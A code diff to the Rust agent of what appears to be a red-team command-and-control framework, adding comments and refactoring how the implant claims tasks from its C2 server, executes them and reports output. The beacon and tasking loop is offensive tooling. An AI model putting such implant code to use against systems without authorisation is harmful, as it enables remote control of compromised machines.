@@ -7,6 +7,10 @@ use c2::{
 use eldritch::Runtime;
 use std::time::{Duration, Instant};
 
+/*
+ * Agent contains all relevant logic for managing callbacks to a c2 server.
+ * It is responsible for obtaining tasks, executing them, and returning their output.
+ */
 pub struct Agent {
     info: Beacon,
     tavern: TavernClient,
@@ -14,6 +18,9 @@ pub struct Agent {
 }
 
 impl Agent {
+    /*
+     * Initialize an agent using the provided configuration.
+     */
     pub async fn gen_from_config(cfg: Config) -> Result<Agent> {
         let tavern = TavernClient::connect(cfg.callback_uri).await?;
 
@@ -24,16 +31,16 @@ impl Agent {
         })
     }
 
+    // Claim tasks and start their execution
     async fn claim_tasks(&mut self) -> Result<()> {
-        let resp = self
+        let tasks = self
             .tavern
             .claim_tasks(ClaimTasksRequest {
                 beacon: Some(self.info.clone()),
             })
-            .await?;
-
-        // TODO: This
-        let tasks = resp.get_ref().tasks.clone();
+            .await?
+            .into_inner()
+            .tasks;
 
         #[cfg(debug_assertions)]
         log::info!("claimed {} tasks", tasks.len());
@@ -56,17 +63,20 @@ impl Agent {
         Ok(())
     }
 
+    // Report task output, remove completed tasks
     async fn report(&mut self) -> Result<()> {
         // Report output from each handle
         let mut idx = 0;
         while idx < self.handles.len() {
-            self.handles[idx].report(&mut self.tavern).await?;
-
             // Drop any handles that have completed
             if self.handles[idx].is_finished() {
-                self.handles.remove(idx);
+                let mut handle = self.handles.remove(idx);
+                handle.report(&mut self.tavern).await?;
                 continue;
             }
+
+            // Otherwise report and increment
+            self.handles[idx].report(&mut self.tavern).await?;
             idx += 1;
         }
 
@@ -94,7 +104,7 @@ impl Agent {
                 Ok(_) => {}
                 Err(_err) => {
                     #[cfg(debug_assertions)]
-                    log::error!("Error draining channel: {}", _err)
+                    log::error!("callback failed: {}", _err);
                 }
             };
 
@@ -105,7 +115,7 @@ impl Agent {
             };
 
             #[cfg(debug_assertions)]
-            log::debug!(
+            log::info!(
                 "completed callback in {}s, sleeping for {}s",
                 start.elapsed().as_secs(),
                 delay.as_secs()
